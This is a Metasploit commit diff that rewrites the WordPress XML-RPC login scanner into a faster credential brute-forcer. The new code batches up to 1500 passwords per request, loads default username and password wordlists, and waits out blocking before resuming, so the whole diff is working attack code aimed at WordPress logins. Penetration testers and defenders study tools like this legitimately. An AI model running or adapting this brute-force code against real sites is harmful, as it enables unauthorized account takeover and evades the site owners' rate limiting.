b1abfe898d0359dc0ee2e5a16250cb0dd03dd96d
wchen-r7 <wei_chen@rapid7.com>
2015-11-24 16:30:34 -0600

    Update wordpress_xmlrpc_login
    Replace the wordpress_xmlrpc_login code with
    wordpress_xmlrpc_massive_bruteforce.rb, which should run a lot
    faster.

--- modules/auxiliary/scanner/http/wordpress_xmlrpc_login.rb
+++ modules/auxiliary/scanner/http/wordpress_xmlrpc_login.rb
@@ -3,11 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+#load "./lib/metasploit/framework/login_scanner/wordpress_rpc.rb"
+
 require 'msf/core'
 require 'metasploit/framework/credential_collection'
 require 'metasploit/framework/login_scanner/wordpress_rpc'
 
 class Metasploit3 < Msf::Auxiliary
+
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::AuthBrute
@@ -15,56 +18,84 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-     'Name'         => 'Wordpress XML-RPC Username/Password Login Scanner',
-     'Description'  => '
-       This module attempts to authenticate against a Wordpress-site
-       (via XMLRPC) using username and password combinations indicated
-       by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
-      ',
-     'Author'      =>
-       [
-         'Cenk Kalpakoglu <cenk.kalpakoglu[at]gmail.com>',
-       ],
-     'License'     => MSF_LICENSE,
-     'References'  =>
-       [
-         ['URL', 'https://wordpress.org/'],
-         ['URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],
-         ['CVE', '1999-0502'] # Weak password
-       ]
-      ))
+      'Name'         => 'Wordpress XML-RPC Username/Password Login Scanner',
+      'Description'  => %q{
+        This module attempts to authenticate against a Wordpress-site
+        (via XMLRPC) using username and password combinations indicated
+        by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
+      },
+      'Author'      =>
+        [
+          'Cenk Kalpakoglu <cenk.kalpakoglu[at]gmail.com>',
+          'Sabri',                           #@KINGSABRI
+          'William <WCoppola[at]Lares.com>'
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          ['URL', 'https://wordpress.org/'],
+          ['URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],
+          ['CVE', '1999-0502'], # Weak password
+          ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/' ],
+          ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
+          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
+        }
+    ))
 
     register_options(
-        [
-          Opt::RPORT(80),
-        ], self.class)
+      [
+        OptInt.new('BLOCKEDWAIT', [ true, 'Time(minutes) to wait if got blocked', 6 ]),
+        OptInt.new('CHUNKSIZE',   [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ])
+      ], self.class)
 
-    deregister_options('BLANK_PASSWORDS') # we don't need this option
+    deregister_options('BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS')
+  end
+
+  def passwords
+    File.readlines(datastore['PASS_FILE']).map {|pass| pass.chomp}
+  end
+
+  def check_setup
+    vprint_status("Checking #{peer} status!")
+
+    if !wordpress_and_online?
+      print_error("#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
+      false
+    elsif !wordpress_xmlrpc_enabled?
+      print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
+      false
+    else
+      print_status("Target #{peer} is running Wordpress")
+      true
+    end
   end
 
   def run_host(ip)
-    print_status("#{peer}:#{wordpress_url_xmlrpc} - Sending Hello...")
-    if wordpress_xmlrpc_enabled?
-      vprint_good("XMLRPC enabled, Hello message received!")
+    if check_setup
+      print_status("XMLRPC enabled, Hello message received!")
     else
       print_error("XMLRPC is not enabled! Aborting")
-      return :abort
+      return
     end
 
     print_status("#{peer} - Starting XML-RPC login sweep...")
 
     cred_collection = Metasploit::Framework::CredentialCollection.new(
-        blank_passwords: datastore['BLANK_PASSWORDS'],
-        pass_file: datastore['PASS_FILE'],
-        password: datastore['PASSWORD'],
+        blank_passwords: true,
         user_file: datastore['USER_FILE'],
-        userpass_file: datastore['USERPASS_FILE'],
-        username: datastore['USERNAME'],
-        user_as_pass: datastore['USER_AS_PASS'],
+        username: datastore['USERNAME']
     )
 
     scanner = Metasploit::Framework::LoginScanner::WordpressRPC.new(
       configure_http_login_scanner(
+        passwords: passwords,
+        chunk_size: datastore['CHUNKSIZE'],
+        block_wait: datastore['BLOCKEDWAIT'],
+        base_uri: target_uri.path,
         uri: wordpress_url_xmlrpc,
         cred_details: cred_collection,
         stop_on_success: datastore['STOP_ON_SUCCESS'],
@@ -79,24 +110,10 @@ class Metasploit3 < Msf::Auxiliary
           module_fullname: self.fullname,
           workspace_id: myworkspace_id
       )
+
       case result.status
         when Metasploit::Model::Login::Status::SUCCESSFUL
-          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
-          credential_core = create_credential(credential_data)
-          credential_data[:core] = credential_core
-          create_credential_login(credential_data)
-          :next_user
-        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-          if datastore['VERBOSE']
-            print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
-          end
-          invalidate_login(credential_data)
-          :abort
-        when Metasploit::Model::Login::Status::INCORRECT
-          if datastore['VERBOSE']
-            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
-          end
-          invalidate_login(credential_data)
+          print_brute :level => :vgood, :ip => ip, :msg => "SUCCESSFUL: #{result.credential}"
       end
     end
 
